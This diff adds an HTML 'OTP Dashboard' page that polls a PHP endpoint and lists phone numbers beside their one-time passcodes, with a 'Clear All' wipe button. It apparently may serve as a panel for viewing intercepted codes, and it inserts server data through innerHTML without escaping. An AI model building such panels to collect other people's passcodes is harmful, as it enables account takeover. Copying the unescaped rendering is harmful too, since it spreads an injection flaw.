@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: #fff; min-height: 100vh; padding: 20px; }
+        h1 { text-align: center; margin-bottom: 20px; color: #304FFE; }
+        .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
+        .stat { background: #1a1a2e; padding: 20px; border-radius: 12px; text-align: center; border-left: 4px solid #304FFE; }
+        .stat h3 { font-size: 28px; color: #304FFE; }
+        .stat p { color: #888; font-size: 13px; margin-top: 5px; }
+        table { width: 100%; border-collapse: collapse; background: #1a1a2e; border-radius: 12px; overflow: hidden; }
+        th { background: #304FFE; padding: 14px; text-align: left; }
+        td { padding: 12px 14px; border-bottom: 1px solid #222; font-size: 14px; }
+        tr:hover td { background: rgba(48,79,254,0.1); }
+        .otp { color: #4CAF50; font-weight: bold; font-family: monospace; }
+        .phone { color: #64B5F6; }
+        .time { color: #888; font-size: 12px; }
+        .btn { background: #ff4444; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+        .btn:hover { background: #cc0000; }
+        .refresh { color: #4CAF50; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+        .empty { text-align: center; padding: 40px; color: #555; }
+        @media(max-width:768px) { .stats { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+<h1><span class="refresh">&#9679;</span> OTP Dashboard</h1>
+
+<div class="stats">
+    <div class="stat"><h3 id="total">0</h3><p>Total OTPs</p></div>
+    <div class="stat"><h3 id="recent">0</h3><p>Last Hour</p></div>
+    <div class="stat"><h3 id="numbers">0</h3><p>Unique Numbers</p></div>
+</div>
+
+<div style="text-align:right;margin-bottom:15px;">
+    <button class="btn" onclick="clearAll()">Clear All</button>
+</div>
+
+<table id="table">
+    <thead>
+        <tr><th>#</th><th>Phone</th><th>OTP</th><th>Time</th></tr>
+    </thead>
+    <tbody id="tbody"></tbody>
+</table>
+
+<div class="empty" id="empty" style="display:none;">No OTPs yet</div>
+
+<script>
+const API = '/api';
+
+function load() {
+    fetch(API + '/view.php')
+        .then(r => r.json())
+        .then(data => {
+            const tbody = document.getElementById('tbody');
+            const entries = Object.entries(data.otps || {});
+            
+            document.getElementById('total').textContent = entries.length;
+            document.getElementById('numbers').textContent = entries.length;
+            
+            let recent = 0;
+            const now = new Date();
+            entries.forEach(([phone, info]) => {
+                const t = new Date(info.updated_at);
+                if (now - t < 3600000) recent++;
+            });
+            document.getElementById('recent').textContent = recent;
+            
+            if (entries.length === 0) {
+                tbody.innerHTML = '';
+                document.getElementById('empty').style.display = 'block';
+                return;
+            }
+            
+            document.getElementById('empty').style.display = 'none';
+            
+            entries.sort((a,b) => new Date(b[1].updated_at) - new Date(a[1].updated_at));
+            
+            tbody.innerHTML = entries.map(([phone, info], i) => `
+                <tr>
+                    <td>${i + 1}</td>
+                    <td class="phone">${phone}</td>
+                    <td class="otp">${info.otp}</td>
+                    <td class="time">${info.updated_at}</td>
+                </tr>
+            `).join('');
+        });
+}
+
+function clearAll() {
+    if (!confirm('Delete all OTPs?')) return;
+    fetch(API + '/clear.php').then(() => load());
+}
+
+load();
+setInterval(load, 10000);
+</script>
+
+</body>
+</html>
